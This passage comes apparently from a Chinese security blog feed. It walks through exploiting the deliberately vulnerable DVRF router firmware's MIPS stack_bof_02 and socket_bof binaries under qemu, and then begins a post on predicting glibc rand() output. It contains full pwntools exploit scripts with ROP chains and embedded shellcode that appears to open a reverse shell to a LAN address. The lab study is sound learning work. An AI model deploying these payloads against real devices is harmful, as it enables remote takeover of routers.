ELF(&quot;./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h1><p>32位小端序mips架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171406868.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171406868.png" alt="image.png"></a><br>主要的一个漏洞仍然是通过strcpy引发的栈溢出 但是该程序没有提供后门函数 并且在描述中提到需要使用shellcode</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v4; // [sp+18h] [+18h] BYREF</span><br><span class="line">  char v5[498]; // [sp+1Ah] [+1Ah] BYREF</span><br><span class="line"></span><br><span class="line">  v4 = 0;</span><br><span class="line">  memset(v5, 0, sizeof(v5));</span><br><span class="line">  if ( argc &lt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Welcome to the Second BoF exercise! You&#x27;ll need Shellcode for this! ;)\r\n\r&quot;);</span><br><span class="line">  strcpy((char *)&amp;v4, argv[1]);</span><br><span class="line">  printf(&quot;You entered %s \r\n&quot;, (const char *)&amp;v4);</span><br><span class="line">  puts(&quot;Try Again\r&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有开启任何保护<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171408877.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171408877.png" alt="image.png"></a><br>那么还是老办法 想办法得到垃圾数据的长度 接着往栈上写入shellcode 随后劫持$ra寄存器跳转至shellcode<br>这里介绍一个工具msfvenom 用其来生成我们所需要的shellcode</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo snap install metasploit-framework 安装</span><br></pre></td></tr></table></figure><p>这里指定一下要生成的类型 执行&#x2F;bin&#x2F;sh的系统调用 mipsel架构 linux平台 去除\x00字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/mipsle/exec  CMD=/bin/sh  --arch mipsle --platform linux -f py --bad-chars &quot;\x00&quot;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404172109163.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404172109163.png" alt="image.png"></a><br>在查询了其他师傅的博客后 发现都提到了一点 即可以利用nop sled来增加shellcode的泛用性<br>大概的原理就是通过大量的nop指令堆在shellcode前面 这样程序执行流不管落在哪里都可以往下执行 和做x86题目用到的思路是一样的<br>不过这里由于我关闭了aslr 所以栈的地址是固定的 就用不上了<br>使用pwntools自带的shellcraft也可以生成shellcode<br>顺带一提 如果使用stack_bof_01的exp脚本那种形式 不知道为什么同样的shellcode无法打通<br>所以这里更换了一下exp 将payload写到文件中 再将文件的内容作为stack_bof_01的参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from systemd import*</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack_addr = 0x407ffbe8</span><br><span class="line">payload = shellcode.ljust(0x1fc,b&#x27;a&#x27;)+p32(stack_addr)</span><br><span class="line"></span><br><span class="line">with open(&quot;payload&quot;,&quot;wb+&quot;) as f:</span><br><span class="line"> f.write(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#io = process(b&quot;./qemu-mipsel-static -L .  -g 1111 ./pwnable/ShellCode_Required/stack_bof_02 &quot;+payload,shell=True)</span><br><span class="line"></span><br><span class="line">#elf = ELF(&quot;./pwnable/ShellCode_Required/stack_bof_02&quot;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-mipsel-static -L .  ./pwnable/ShellCode_Required/stack_bof_02 &quot;$(cat payload)&quot;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281019473.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281019473.png" alt="image.png"></a></p><h1 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h1><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281022879.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281022879.png" alt="image.png"></a><br>32位小端序mips架构<br>保护全关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281058933.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281058933.png" alt="image.png"></a><br>接着来分析一下程序的主体逻辑</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  uint16_t v3; // $v0</span><br><span class="line">  int v4; // $v0</span><br><span class="line">  int v5; // $v0</span><br><span class="line">  size_t v6; // $v0</span><br><span class="line">  int v8; // [sp+24h] [+24h]</span><br><span class="line">  int fd; // [sp+28h] [+28h]</span><br><span class="line">  __int16 v10; // [sp+2Ch] [+2Ch] BYREF</span><br><span class="line">  char v11[498]; // [sp+2Eh] [+2Eh] BYREF</span><br><span class="line">  __int16 v12; // [sp+220h] [+220h] BYREF</span><br><span class="line">  char v13[48]; // [sp+222h] [+222h] BYREF</span><br><span class="line">  int v14; // [sp+254h] [+254h] BYREF</span><br><span class="line">  struct sockaddr v15; // [sp+258h] [+258h] BYREF</span><br><span class="line"></span><br><span class="line">  if ( argc &lt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Usage: %s port_number - by b1ack0wl\n&quot;, *argv);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  memset(v11, 0, sizeof(v11));</span><br><span class="line">  v12 = 0;</span><br><span class="line">  memset(v13, 0, sizeof(v13));</span><br><span class="line">  v14 = 1;</span><br><span class="line">  fd = socket(2, 2, 0);</span><br><span class="line">  bzero(&amp;v15, 0x10u);</span><br><span class="line">  v15.sa_family = 2;</span><br><span class="line">  *&amp;v15.sa_data[2] = htons(0);</span><br><span class="line">  v3 = atoi(argv[1]);</span><br><span class="line">  *v15.sa_data = htons(v3);</span><br><span class="line">  v4 = atoi(argv[1]);</span><br><span class="line">  printf(&quot;Binding to port %i\n&quot;, v4);</span><br><span class="line">  if ( bind(fd, &amp;v15, 0x10u) == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = atoi(argv[1]);</span><br><span class="line">    printf(&quot;Error Binding to port %i\n&quot;, v5);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( setsockopt(fd, 0xFFFF, 4, &amp;v14, 4u) &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Setsockopt failed :(&quot;);</span><br><span class="line">    close(fd);</span><br><span class="line">    exit(2);</span><br><span class="line">  &#125;</span><br><span class="line">  listen(fd, 2);</span><br><span class="line">  v8 = accept(fd, 0, 0);</span><br><span class="line">  bzero(&amp;v10, 0x1F4u);</span><br><span class="line">  write(v8, &quot;Send Me Bytes:&quot;, 0xEu);</span><br><span class="line">  read(v8, &amp;v10, 0x1F4u);</span><br><span class="line">  sprintf(&amp;v12, &quot;nom nom nom, you sent me %s&quot;, &amp;v10);</span><br><span class="line">  printf(&quot;Sent back - %s&quot;, &amp;v10);</span><br><span class="line">  v6 = strlen(&amp;v12);</span><br><span class="line">  write(v8, &amp;v12, v6 + 1);</span><br><span class="line">  shutdown(v8, 2);</span><br><span class="line">  shutdown(fd, 2);</span><br><span class="line">  close(v8);</span><br><span class="line">  close(fd);</span><br><span class="line">  return 66;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仍然对于argc进行了限制 需要我们提供程序参数<br>接着建立了一个socket通信 使用AF_INET协议族 即ipv4 套接字类型为数据报套接字 传输协议默认使用ip<br>随后使用bzero清空了v15数组 该数组用于存储socket信息<br>我们输入的参数赋值于sa_data成员 同时经过了htons函数 由小端序变为大端序<br>这里充当的是端口 随后利用bind函数和指定的端口相连<br>接着调用listen函数等待指定的端口出现客户端连接 这里的程序充当服务端<br>accept函数用于接受客户端的请求<br>接受到的数据存放于v10数组<br>漏洞出现在sprintf函数中 可以造成栈溢出<br>显然 这里的攻击思路就是劫持程序执行流 使其跳转到我们写入的shellcode</p><p>首先还是要获取偏移</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-mipsel-static -L . -g 1234 ./pwnable/ShellCode_Required/socket_bof 9999</span><br></pre></td></tr></table></figure><p>先启动程序 程序的端口为1234 监听的端口为9999<br>随后gdb连接1234 断点打在read函数 调用exp脚本发送垃圾数据 断点打在赋值ra寄存器那边 得到偏移为0x33</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from systemd import*</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">io = remote(&quot;127.0.0.1&quot;,9999)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Send Me Bytes:&quot;)</span><br><span class="line">io.sendline(cyclic(0x300))</span><br></pre></td></tr></table></figure><p>按照原本的想法 直接打shellcode就行了 但是最后无法实现  查阅了其他师傅的博客<br>问题出在mips架构的缓存不一致性 这一概念该如何理解<br>对于cpu的cache缓存一定不陌生 L1 cache为了处理指令和数据 指令是只读 而数据是读写  为了提高读写效率 将其分为了两个cache I-cache(指令缓存) D-cache(数据缓存)<br>所以这里需要将我们写入的shellcode从D-cache刷新到I-cache<br>理解到这里 产生了一个疑问 为什么在stack_bof_02中 我们写入的shellcode不需要考虑到该问题 即可生效<br>对比二者的程序逻辑 最明显的不同在于stack_bof_02从指令行中读取参数 socket_bof利用socket来获取数据<br>猜测通过socket传输的数据存储在了D-cache中<br>那么如何把数据从D-cache刷新到I-cache 利用sleep函数<br>给予一定的时间 来让D-cache和I-cache二者同步<br>所以接下来的目标就是寻找gadget 执行sleep(1)后跳转到shellcode<br>这里学习使用一个新的工具 ida的插件mipsrop<br>具体的安装和使用自行搜索教程 这里提一个我遇到的报错<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121452160.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121452160.png" alt="image.png"></a><br>在edit中plugins的MIPS ROP Finder可以正常运行 但是在执行mipsrop.find(“li $a0,1”)时报错<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121455132.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121455132.png" alt="image.png"></a><br>参照该教程 成功解决问题<a href="https://blog.csdn.net/snowleopard_bin/article/details/115376333">https://blog.csdn.net/snowleopard_bin/article/details/115376333</a><br>执行mipsrop.find(“li $a0,1”)用来控制$a0寄存器 作为sleep函数的参数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121511063.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121511063.png" alt="image.png"></a><br>这里选用0x00018AA8这一条gadget<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121517986.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121517986.png" alt="image.png"></a><br>执行完li $a0,1后 跳转的地址依赖于$s3寄存器<br>接下来需要获取控制$s3寄存器的gadget<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405181537847.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405181537847.png" alt="image.png"></a><br>有很多条  这里选用0x7730处的gadget<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405190954232.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405190954232.png" alt="image.png"></a><br>在我们执行完sleep函数后 还需要跳转到shellcode处执行 那么这里就需要错开寄存器<br>使用$s2或者$s1寄存器来跳转<br>可以使用mipsrop.tail()函数 该函数可以查询所有函数尾部调用的gadget<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405191016154.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405191016154.png" alt="image.png"></a><br>选择0x20F1C的gadget 通过$s2来执行shellcode<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405191025964.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405191025964.png" alt="image.png"></a><br>那么总结一下gadget的执行顺序  首先执行0x7730的gadget 控制$s3为sleep函数的地址 $s2为0x00018AA8这条gadget的地址<br>再控制$ra为0x20F1C的gadget 这条gadget控制$ra为shellcode的地址<br>编写如下poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from systemd import*</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">io = remote(&quot;127.0.0.1&quot;,7777)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Send Me Bytes:&quot;)</span><br><span class="line"></span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21&quot;</span><br><span class="line">buf += b&quot;\xfd\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24&quot;</span><br><span class="line">buf += b&quot;\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f&quot;</span><br><span class="line">buf += b&quot;\xfd\xff\x0f\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf&quot;</span><br><span class="line">buf += b&quot;\x11\x5c\x0e\x3c\x11\x5c\xce\x35\xe4\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xf7\x83\x0e\x3c\xc0\xa8\xce\x35\xe6\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xe2\xff\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01&quot;</span><br><span class="line">buf += b&quot;\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x11\x24&quot;</span><br><span class="line">buf += b&quot;\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02&quot;</span><br><span class="line">buf += b&quot;\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24&quot;</span><br><span class="line">buf += b&quot;\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28&quot;</span><br><span class="line">buf += b&quot;\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf&quot;</span><br><span class="line">buf += b&quot;\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf&quot;</span><br><span class="line">buf += b&quot;\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24&quot;</span><br><span class="line">buf += b&quot;\x0c\x01\x01\x01&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode_addr = 0x408000a0</span><br><span class="line">libc_addr = 0x3fee5000</span><br><span class="line">gadget1 = libc_addr + 0x7730</span><br><span class="line">gadget2 = libc_addr + 0x00018AA8</span><br><span class="line">gadget3 = libc_addr + 0x20F1C</span><br><span class="line">sleep_addr = libc_addr + 0x2F2B0</span><br><span class="line">payload = cyclic(0x33)+p32(gadget1)</span><br><span class="line">payload += cyclic(0x20)+p32(gadget2)+p32(sleep_addr)+p32(gadget3)</span><br><span class="line">payload += cyclic(0x24)+p32(gadget2)+p32(shellcode_addr)+buf</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>执行发现程序卡在sleep函数执行中的这里<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201758720.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201758720.png" alt="image.png"></a><br>问题出在$s2寄存器上<br>本句汇编的作用为 将$s0的值赋值给$s2+0x64处的地址<br>而此时对应的地址权限为不可写<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201913820.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201913820.png" alt="image.png"></a><br>同时 在libc文件中定位到一段gadget<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201919095.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201919095.png" alt="image.png"></a><br>这里对于$s2寄存器减去了大概0x4000多字节 所以我们要做的就是在执行gadget2的时候 把$s2寄存器替换为一个可读地址加上0x4000字节<br>更改后的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = cyclic(0x33)+p32(gadget1)</span><br><span class="line">payload += cyclic(0x20)+p32(gadget2)+p32(sleep_addr)+p32(gadget3)</span><br><span class="line">payload += cyclic(0x24)+p32(shellcode_addr+0x4000)+cyclic(0x4)+p32(shellcode_addr)+buf</span><br></pre></td></tr></table></figure><p>此时已经可以成功执行sleep函数 但是新的问题出现了 没有按照预期的执行完sleep函数后根据$ra寄存器中的shellcode地址进行跳转 分析了sleep函数的汇编后<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405202047200.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405202047200.png" alt="image.png"></a><br>发现问题出在sleep函数在结束的时候 还会对$ra寄存器重新赋值<br>所以需要根据偏移重新布置栈<br>这里解释一下为什么我的shellcode前面要有那么多额外的偏移 这是因为我shellcode如果不增加偏移的话 地址为0x408000a4 这其中有\x00字节  会导致后面的字节都无法传输 所以将其更改为\x01<br>完整exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from systemd import*</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">io = remote(&quot;127.0.0.1&quot;,2222)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Send Me Bytes:&quot;)</span><br><span class="line"></span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21&quot;</span><br><span class="line">buf += b&quot;\xfd\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24&quot;</span><br><span class="line">buf += b&quot;\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f&quot;</span><br><span class="line">buf += b&quot;\xfd\xff\x0f\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf&quot;</span><br><span class="line">buf += b&quot;\x11\x5c\x0e\x3c\x11\x5c\xce\x35\xe4\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xf7\x83\x0e\x3c\xc0\xa8\xce\x35\xe6\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xe2\xff\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01&quot;</span><br><span class="line">buf += b&quot;\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x11\x24&quot;</span><br><span class="line">buf += b&quot;\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02&quot;</span><br><span class="line">buf += b&quot;\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24&quot;</span><br><span class="line">buf += b&quot;\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28&quot;</span><br><span class="line">buf += b&quot;\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf&quot;</span><br><span class="line">buf += b&quot;\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf&quot;</span><br><span class="line">buf += b&quot;\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24&quot;</span><br><span class="line">buf += b&quot;\x0c\x01\x01\x01&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode_addr = 0x408001a4</span><br><span class="line">libc_addr = 0x3fee5000</span><br><span class="line">gadget1 = libc_addr + 0x7730</span><br><span class="line">gadget2 = libc_addr + 0x00018AA8</span><br><span class="line">gadget3 = libc_addr + 0x20F1C</span><br><span class="line">sleep_addr = libc_addr + 0x2F2B0</span><br><span class="line">payload = cyclic(0x33)+p32(gadget1)</span><br><span class="line">payload += cyclic(0x20)+p32(gadget2)+p32(sleep_addr)+p32(gadget3)</span><br><span class="line">payload += cyclic(0x24)+p32(shellcode_addr+0x4000)+p32(shellcode_addr)+cyclic(0x30)+p32(shellcode_addr)+cyclic(0x100-0x30)+buf</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405202049562.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405202049562.png" alt="image.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>伪随机数推算</title>
    <link href="http://example.com/2023/10/30/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%8E%A8%E7%AE%97/"/>
    <id>http://example.com/2023/10/30/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%8E%A8%E7%AE%97/</id>
    <published>2023-10-30T12:42:05.000Z</published>
    <updated>2023-11-04T02:09:44.907Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以往遇到的考察伪随机数的题目都相对比较简单 无非就是通过seed来推算出后续的随机数 但是这次的核心在于 seed不可控且不可知的情况下 如何通过seed生成的伪随机数 来推算出后续的随机数</p><h1 id="rand函数源码分析"><a href="#rand函数源码分析" class="headerlink" title="rand函数源码分析"></a>rand函数源码分析</h1><p>先来弄懂 rand函数究竟是如何通过seed来生成随机数的<br>以下代码均从 <a href="https://codebrowser.dev/glibc/">https://codebrowser.dev/glibc/</a> 摘录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Return a random integer between 0 and RAND_MAX.  */</span><br><span class="line">int</span><br><span class="line">rand (void)</span><br><span class="line">&#123;</span><br><span class="line">  return (int) __random ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内部进而调用了__random函数 跟进一下看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__random (void)</span><br><span class="line">&#123;</span><br><span class="line">  int32_t retval;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  (void) __random_r (buf: &amp;unsafe_state, result: &amp;retval);</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  return retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点关注一下__random_r函数 unsafe_state结构体作为参数传输 返回值存储于retval</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static struct random_data unsafe_state =</span><br><span class="line">&#123;</span><br><span class="line">    /* FPTR和RPTR是指向状态信息的两个指针，一个前指针和一个后指针。</span><br><span class="line">       这两个指针始终相隔rand_sep个位置，因为它们在状态信息中循环。</span><br><span class="line">       （是的，这意味着我们可以只用一个指针，但是这种方式的random代码更高效）。</span><br><span class="line">       这两个指针的位置是从调用initstate(1, randtbl, 128)的位置开始：</span><br><span class="line">       （后指针rptr的位置实际上是0（如上面在初始化randtbl时解释的那样），</span><br><span class="line">       因为状态表指针被设置为指向randtbl[1]（如下面解释的那样）。）*/</span><br><span class="line"></span><br><span class="line">    .fptr = &amp;randtbl[SEP_3 + 1],    // SEP_3 = 3</span><br><span class="line">    .rptr = &amp;randtbl[1],</span><br><span class="line"></span><br><span class="line">    /* 以下内容是指向状态信息表的指针、当前生成器的类型、当前多项式的度数和两个指针之间的间隔。</span><br><span class="line">       注意，为了random的效率，我们记住状态信息的第一个位置，而不是第零个位置。</span><br><span class="line">       因此，访问state[-1]是有效的，它用于存储R.N.G.的类型。</span><br><span class="line">       另外，我们记住最后一个位置，因为这比每次索引以查找最后一个元素的地址来判断前后指针是否已经回绕更高效。 */</span><br><span class="line"></span><br><span class="line">    .state = &amp;randtbl[1],</span><br><span class="line"></span><br><span class="line">    .rand_type = TYPE_3,    // 3</span><br><span class="line">    .rand_deg = DEG_3,      // 3</span><br><span class="line">    .rand_sep = SEP_3,      // 3</span><br><span class="line"></span><br><span class="line">    .end_ptr = &amp;randtbl[sizeof(randtbl) / sizeof(randtbl[0])]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据注释可以得到 fptr和rptr是指向状态信息的前后指针 并且虽然rptr的起始是randtbl[1]但是实际上是0<br>为了理解这一描述 我们先来看一下randtbl数组的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static int32_t randtbl[DEG_3 + 1] =</span><br><span class="line">&#123;</span><br><span class="line">    TYPE_3,</span><br><span class="line"></span><br><span class="line">    -1726662223, 379960547, 1735697613, 1040273694, 1313901226,</span><br><span class="line">    1627687941, -179304937, -2073333483, 1780058412, -1989503057,</span><br><span class="line">    -615974602, 344556628, 939512070, -1249116260, 1507946756,</span><br><span class="line">    -812545463, 154635395, 1388815473, -1926676823, 525320961,</span><br><span class="line">    -1009028674, 968117788, -123449607, 1284210865, 435012392,</span><br><span class="line">    -2017506339, -911064859, -370259173, 1132637927, 1398500161,</span><br><span class="line">    -205601318</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该数组存储着内部状态信息 用于随机数的生成<br>通过randtbl数组的注释 我们可以得知上文中 后指针的位置为0的原因</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Initially, everything is set up as if from: ↪</span><br><span class="line">    initstate(1, randtbl, 128); ↪</span><br><span class="line">   Note that this initialization takes advantage of the fact that srandom ↪</span><br><span class="line">   advances the front and rear pointers 10*rand_deg times, and hence the ↪</span><br><span class="line">   rear pointer which starts at 0 will also end up at zero; thus the zeroth ↪</span><br><span class="line">   element of the state information, which contains info about the current ↪</span><br><span class="line">   position of the rear pointer is just ↪</span><br><span class="line">    (MAX_TYPES * (rptr - state)) + TYPE_3 == TYPE_3.</span><br></pre></td></tr></table></figure><p>后指针在初始化的时候指向第一个元素 所以第一个元素存储的是后指针当前位置的信息<br>接着我们回到unsafe_state结构体<br>其还定义了其他成员 用来记录生成器类型 随机次数 随机间隔<br>此外还记录了最后一个元素的位置<br>接下来分析一下__random_r函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __random_r(struct random_data *buf, int32_t *result)</span><br><span class="line">&#123;</span><br><span class="line">    int32_t *state;</span><br><span class="line"></span><br><span class="line">    if (buf == NULL || result == NULL)</span><br><span class="line">        goto fail;</span><br><span class="line"></span><br><span class="line">    state = buf-&gt;state;</span><br><span class="line"></span><br><span class="line"> 